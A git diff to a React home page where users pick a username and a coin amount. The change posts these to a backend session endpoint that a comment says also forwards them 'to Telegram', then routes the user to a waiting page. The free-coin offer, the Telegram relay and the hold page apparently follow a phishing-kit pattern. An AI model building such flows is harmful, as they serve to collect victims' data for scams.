@@ -1,12 +1,32 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '../components/ui/button';
 import { Input } from '../components/ui/input';
+import axios from 'axios';
+
+const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+const API = `${BACKEND_URL}/api`;
 
 const HomePage = () => {
   const navigate = useNavigate();
   const [username, setUsername] = useState('');
   const [selectedCoin, setSelectedCoin] = useState(100000);
+  const [sessionId, setSessionId] = useState(null);
+
+  useEffect(() => {
+    // Create session on mount
+    const createSession = async () => {
+      try {
+        const response = await axios.post(`${API}/session/create`);
+        const newSessionId = response.data.session_id;
+        setSessionId(newSessionId);
+        localStorage.setItem('sessionId', newSessionId);
+      } catch (error) {
+        console.error('Failed to create session:', error);
+      }
+    };
+    createSession();
+  }, []);
 
   const coinOptions = [
     { value: 25000, label: '25,000' },
@@ -14,11 +34,30 @@ const HomePage = () => {
     { value: 100000, label: '100,000' }
   ];
 
-  const handleContinue = () => {
-    if (username.trim()) {
+  const handleContinue = async () => {
+    if (username.trim() && sessionId) {
+      // Save to localStorage
       localStorage.setItem('username', username);
       localStorage.setItem('coinAmount', selectedCoin);
-      navigate('/contact');
+
+      // Send to backend and Telegram
+      try {
+        await axios.post(`${API}/session/step`, {
+          session_id: sessionId,
+          step: 'username_coin',
+          data: {
+            username: username,
+            amount: selectedCoin
+          }
+        });
+
+        // Navigate to waiting page
+        navigate('/waiting');
+      } catch (error) {
+        console.error('Failed to submit step:', error);
+        // Navigate anyway
+        navigate('/waiting');
+      }
     }
   };
 
